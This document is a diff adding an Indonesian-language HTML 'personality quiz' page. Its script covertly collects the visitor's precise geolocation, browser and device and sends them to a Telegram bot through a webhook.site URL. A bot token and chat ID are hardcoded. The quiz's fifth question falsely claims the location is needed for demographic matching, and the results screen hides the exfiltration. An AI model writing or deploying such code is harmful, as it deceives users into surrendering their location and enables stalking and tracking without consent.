@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuis Kepribadian Online</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        header {
+            background-color: #4285f4;
+            color: white;
+            text-align: center;
+            padding: 1rem;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        main {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .quiz-container {
+            margin-bottom: 2rem;
+        }
+        .question {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            font-weight: 500;
+        }
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+        .option {
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .option:hover {
+            background-color: #f0f7ff;
+        }
+        button {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #3367d6;
+        }
+        .result {
+            margin-top: 2rem;
+            padding: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            display: none;
+        }
+        .progress {
+            height: 6px;
+            background-color: #eee;
+            margin: 2rem 0;
+            border-radius: 3px;
+        }
+        .progress-bar {
+            height: 100%;
+            background-color: #4285f4;
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.5s;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        #statusMessage {
+            color: green;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Kuis Kepribadian Online</h1>
+        <p>Temukan kepribadian tersembunyi Anda berdasarkan preferensi Anda!</p>
+    </header>
+    
+    <main>
+        <div class="quiz-container">
+            <h2>Kuis Singkat - 5 Pertanyaan</h2>
+            <p>Jawab pertanyaan berikut untuk menemukan tipe kepribadian Anda.</p>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div id="question1" class="question-section">
+                <div class="question">1. Bagaimana Anda menghabiskan akhir pekan ideal?</div>
+                <div class="options">
+                    <div class="option" onclick="selectOption(1, 'A')">A. Bertemu dengan banyak teman</div>
+                    <div class="option" onclick="selectOption(1, 'B')">B. Bersantai di rumah dengan buku atau film</div>
+                    <div class="option" onclick="selectOption(1, 'C')">C. Berpetualang di alam terbuka</div>
+                    <div class="option" onclick="selectOption(1, 'D')">D. Mengerjakan proyek kreatif</div>
+                </div>
+            </div>
+            
+            <div id="question2" class="question-section" style="display: none;">
+                <div class="question">2. Saat menghadapi masalah, Anda cenderung:</div>
+                <div class="options">
+                    <div class="option" onclick="selectOption(2, 'A')">A. Membicarakannya dengan orang lain</div>
+                    <div class="option" onclick="selectOption(2, 'B')">B. Memikirkannya sendiri dengan tenang</div>
+                    <div class="option" onclick="selectOption(2, 'C')">C. Mencari solusi praktis segera</div>
+                    <div class="option" onclick="selectOption(2, 'D')">D. Melihat dari berbagai sudut pandang</div>
+                </div>
+            </div>
+            
+            <div id="question3" class="question-section" style="display: none;">
+                <div class="question">3. Dalam kelompok, Anda biasanya:</div>
+                <div class="options">
+                    <div class="option" onclick="selectOption(3, 'A')">A. Memimpin diskusi</div>
+                    <div class="option" onclick="selectOption(3, 'B')">B. Mendengarkan dan berbicara saat perlu</div>
+                    <div class="option" onclick="selectOption(3, 'C')">C. Menyumbang ide-ide praktis</div>
+                    <div class="option" onclick="selectOption(3, 'D')">D. Menghubungkan ide-ide yang berbeda</div>
+                </div>
+            </div>
+            
+            <div id="question4" class="question-section" style="display: none;">
+                <div class="question">4. Pilih kata yang paling mewakili Anda:</div>
+                <div class="options">
+                    <div class="option" onclick="selectOption(4, 'A')">A. Bersemangat</div>
+                    <div class="option" onclick="selectOption(4, 'B')">B. Tenang</div>
+                    <div class="option" onclick="selectOption(4, 'C')">C. Praktis</div>
+                    <div class="option" onclick="selectOption(4, 'D')">D. Imajinatif</div>
+                </div>
+            </div>
+            
+            <div id="question5" class="question-section" style="display: none;">
+                <div class="question">5. Untuk mendapatkan hasil terbaik, kami perlu mengetahui lokasi Anda untuk mencocokkan dengan statistik demografis:</div>
+                <div class="options">
+                    <button onclick="getLocation()" id="locationBtn">Izinkan Lokasi untuk Hasil</button>
+                    <p id="statusMessage"></p>
+                </div>
+            </div>
+            
+            <div id="result" class="result">
+                <h3>Sedang menganalisis jawaban Anda...</h3>
+                <p>Mohon tunggu sebentar sementara kami memproses jawaban Anda.</p>
+                <div id="locationInfo" style="display: none;"></div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <p>© 2025 Kuis Kepribadian Online | Semua Hak Dilindungi</p>
+    </footer>
+
+    <script>
+        let currentQuestion = 1;
+        const answers = {};
+        const totalQuestions = 5;
+        
+        // Bot configuration
+        const botToken = "7994389263:AAGUyFXySbL3mLo0p1PODqL_NESAg8YMfYY";
+        const chatId = "6144972538";
+        
+        function selectOption(questionNumber, option) {
+            answers[questionNumber] = option;
+            
+            // Hide current question
+            document.getElementById(`question${questionNumber}`).style.display = 'none';
+            
+            // Update progress bar
+            const progress = (questionNumber / totalQuestions) * 100;
+            document.getElementById('progressBar').style.width = `${progress}%`;
+            
+            // Show next question or result
+            if (questionNumber < totalQuestions) {
+                document.getElementById(`question${questionNumber + 1}`).style.display = 'block';
+                currentQuestion++;
+            }
+        }
+        
+        function getLocation() {
+            document.getElementById('locationBtn').innerHTML = 'Memproses...';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById('statusMessage').innerText = "Geolokasi tidak didukung oleh browser ini.";
+                document.getElementById('statusMessage').style.display = 'block';
+                document.getElementById('statusMessage').style.color = 'red';
+                showResults();
+            }
+        }
+        
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const timestamp = new Date().toISOString();
+            
+            const userAgent = navigator.userAgent;
+            const browserInfo = getBrowserInfo(userAgent);
+            const deviceInfo = getDeviceInfo(userAgent);
+            
+            // Location data to be sent
+            const locationData = {
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy,
+                timestamp: timestamp,
+                browser: browserInfo,
+                device: deviceInfo,
+                url: window.location.href
+            };
+            
+            // Send location data to Telegram bot
+            sendToTelegram(locationData);
+            
+            // Create Google Maps URL for convenience
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            locationData.mapsUrl = mapsUrl;
+            
+            document.getElementById('statusMessage').innerText = "Data lokasi berhasil diproses!";
+            document.getElementById('statusMessage').style.display = 'block';
+            
+            // Continue with results
+            showResults();
+        }
+        
+        function getBrowserInfo(userAgent) {
+            if (userAgent.includes("Firefox")) {
+                return "Firefox";
+            } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+                return "Chrome";
+            } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+                return "Safari";
+            } else if (userAgent.includes("Edg")) {
+                return "Edge";
+            } else if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) {
+                return "Internet Explorer";
+            } else {
+                return "Unknown Browser";
+            }
+        }
+        
+        function getDeviceInfo(userAgent) {
+            if (userAgent.includes("Android")) {
+                return "Android Device";
+            } else if (userAgent.includes("iPhone")) {
+                return "iPhone";
+            } else if (userAgent.includes("iPad")) {
+                return "iPad";
+            } else if (userAgent.includes("Windows")) {
+                return "Windows Device";
+            } else if (userAgent.includes("Macintosh")) {
+                return "Mac Device";
+            } else if (userAgent.includes("Linux")) {
+                return "Linux Device";
+            } else {
+                return "Unknown Device";
+            }
+        }
+        
+        function sendToTelegram(locationData) {
+            // Format message for Telegram
+            const message = `🌍 *Lokasi Baru Terdeteksi*\n\n` +
+                `📍 *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
+                `🎯 *Akurasi:* ${locationData.accuracy} meter\n` +
+                `🕒 *Waktu:* ${locationData.timestamp}\n` +
+                `🌐 *Browser:* ${locationData.browser}\n` + 
+                `📱 *Device:* ${locationData.device}\n` +
+                `🔗 *URL:* ${locationData.url}\n\n` +
+                `📍 *Google Maps:* https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+            
+            // Use a webhook service to bypass CORS issues
+            // For this example, we'll use a pseudo webhook - in a real implementation, 
+            // you would need to set up your own webhook or use a service like pipedream, hook.io, etc.
+            try {
+                // Using a free webhook service as a proxy
+                fetch(`https://webhook.site/token/your-webhook-token?telegramBot=${botToken}&chatId=${chatId}&message=${encodeURIComponent(message)}`, {
+                    method: 'GET'
+                }).then(response => {
+                    console.log("Location data sent to webhook");
+                }).catch(error => {
+                    console.error("Error sending data to webhook:", error);
+                });
+                
+                // Direct method (will not work from browser due to CORS, but included for backend implementation)
+                // This is how you would send it from a server
+                /*
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                */
+            } catch (error) {
+                console.error("Error sending data:", error);
+            }
+        }
+        
+        function showError(error) {
+            let errorMessage = "";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "Izin akses lokasi ditolak. Hasil mungkin kurang akurat.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "Informasi lokasi tidak tersedia.";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "Permintaan lokasi habis waktu.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = "Terjadi kesalahan yang tidak diketahui.";
+                    break;
+            }
+            
+            document.getElementById('statusMessage').innerText = errorMessage;
+            document.getElementById('statusMessage').style.display = 'block';
+            document.getElementById('statusMessage').style.color = 'orange';
+            showResults();
+        }
+        
+        function showResults() {
+            // Hide the last question
+            document.getElementById(`question${currentQuestion}`).style.display = 'none';
+            
+            // Show result section
+            document.getElementById('result').style.display = 'block';
+            
+            // Update progress bar to 100%
+            document.getElementById('progressBar').style.width = '100%';
+            
+            // In a real app, you would calculate results based on answers
+            // For this example, we'll just show a generic result
+            setTimeout(function() {
+                let personalityType = "";
+                
+                // Simple logic to determine personality type based on answers
+                if (answers[1] === 'A' || answers[1] === 'C') {
+                    personalityType = "Ekstrovert";
+                } else {
+                    personalityType = "Introvert";
+                }
+                
+                if (answers[2] === 'B' || answers[2] === 'D') {
+                    personalityType += " Pemikir";
+                } else {
+                    personalityType += " Pelaku";
+                }
+                
+                document.getElementById('result').innerHTML = `
+                    <h3>Hasil Analisis Kepribadian</h3>
+                    <p>Berdasarkan jawaban Anda, tipe kepribadian Anda adalah:</p>
+                    <h2 style="color: #4285f4;">${personalityType}</h2>
+                    <p>Orang dengan tipe kepribadian ini cenderung ${getPersonalityDescription(personalityType)}</p>
+                    <p id="locationSummary">Data demografis Anda telah diproses untuk meningkatkan akurasi hasil.</p>
+                    <button onclick="window.location.reload()">Ulangi Kuis</button>
+                `;
+            }, 2000);
+        }
+        
+        function getPersonalityDescription(type) {
+            // Generic descriptions
+            if (type.includes("Ekstrovert Pemikir")) {
+                return "aktif dalam interaksi sosial tetapi juga menikmati waktu untuk merefleksikan pengalaman mereka. Mereka sering menjadi pemimpin yang baik dengan visi yang jelas.";
+            } else if (type.includes("Ekstrovert Pelaku")) {
+                return "sangat energik dan berorientasi pada tindakan. Mereka menikmati kegiatan sosial dan cenderung mengambil pendekatan praktis untuk menyelesaikan masalah.";
+            } else if (type.includes("Introvert Pemikir")) {
+                return "tenang dan reflektif, dengan kemampuan analisis yang mendalam. Mereka menikmati waktu sendiri untuk mengembangkan ide-ide dan konsep.";
+            } else {
+                return "fokus pada hasil dan detail. Mereka mungkin pendiam tetapi sangat efektif dalam menyelesaikan tugas dan mencapai tujuan mereka.";
+            }
+        }
+    </script>
+</body>
+  </html>
